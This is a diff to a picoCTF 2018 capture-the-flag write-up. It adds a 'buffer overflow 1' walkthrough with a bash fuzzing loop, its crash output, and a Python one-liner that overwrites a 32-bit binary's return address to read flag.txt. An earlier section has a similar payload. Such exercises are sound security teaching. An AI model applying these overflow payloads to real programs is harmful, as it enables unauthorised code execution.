@@ -214,7 +214,7 @@ We can see our flag right there our flag ``` picoCTF{client_is_bad_debbd} ```
 
 # binary exploitation buffer overflow 0 - Points: 150 - (Solves: 65)
 
-we first checked what kind of binary.
+we first checked what kind of binary is.
 
 ![binary_bof_0](https://github.com/SkyBulk/picoCTF2018/blob/master/images/binary_bof_0_0.png)
 
@@ -229,6 +229,79 @@ the binary display a ``` main , and vuln function ``` with their address , and w
 it show us , we see we got an overflow and their offset at 24 then we prepare our payload to read the flag.txt
 
 ``` ./vuln `python -c "print 'A'*24+'\x67\x86\x04\x08'*4"` ```
+
+# buffer overflow 1 - Points: 200 - (Solves: 17)
+
+we first checked what kind of binary is.
+
+![binary_bof_1](https://github.com/SkyBulk/picoCTF2018/blob/master/images/binary_bof_1_0.png)
+
+once after we see it is an ELF 32 bits, then we ran GDB to see their functions, and binary security.
+
+![binary_bof_1](https://github.com/SkyBulk/picoCTF2018/blob/master/images/binary_bof_1_1.png)
+
+the binary display a ``` main , and vuln function ``` with their address , and we make our fuzzer to fuzz our binary as below
+
+
+
+```
+m4st3rrulezs@m4st3rrulezs:~/Downloads$ for i in `seq 1 100`; do echo $i; python -c "print 'A'*$i+'\xcb\x85\x04\x08'*$i" | ./vuln; done
+1
+Please enter your string: 
+Okay, time to return... Fingers Crossed... Jumping to 0x80486b3
+2
+Please enter your string: 
+Okay, time to return... Fingers Crossed... Jumping to 0x80486b3
+3
+Please enter your string: 
+Okay, time to return... Fingers Crossed... Jumping to 0x80486b3
+4
+Please enter your string: 
+Okay, time to return... Fingers Crossed... Jumping to 0x80486b3
+5
+Please enter your string: 
+Okay, time to return... Fingers Crossed... Jumping to 0x80486b3
+6
+Please enter your string: 
+Okay, time to return... Fingers Crossed... Jumping to 0x80486b3
+7
+Please enter your string: 
+Okay, time to return... Fingers Crossed... Jumping to 0x80486b3
+8
+Please enter your string: 
+Okay, time to return... Fingers Crossed... Jumping to 0x80486b3
+Segmentation fault (core dumped)
+9
+Please enter your string: 
+Okay, time to return... Fingers Crossed... Jumping to 0x8040008
+Segmentation fault (core dumped)
+10
+Please enter your string: 
+Okay, time to return... Fingers Crossed... Jumping to 0x85cb0804
+Segmentation fault (core dumped)
+11
+Please enter your string: 
+Okay, time to return... Fingers Crossed... Jumping to 0xcb080485
+Segmentation fault (core dumped)
+12
+Please enter your string: 
+Okay, time to return... Fingers Crossed... Jumping to 0x80485cb
+hola
+hola
+hola
+hola
+Segmentation fault (core dumped)
+
+```
+
+
+we see the offset is at 12 , then we prepare our payload to read flag.txt 
+
+``` python -c "print 'A'*12+'\xcb\x85\x04\x08'*9" | ./vuln ```
+
+
+
+
 
 ***
 
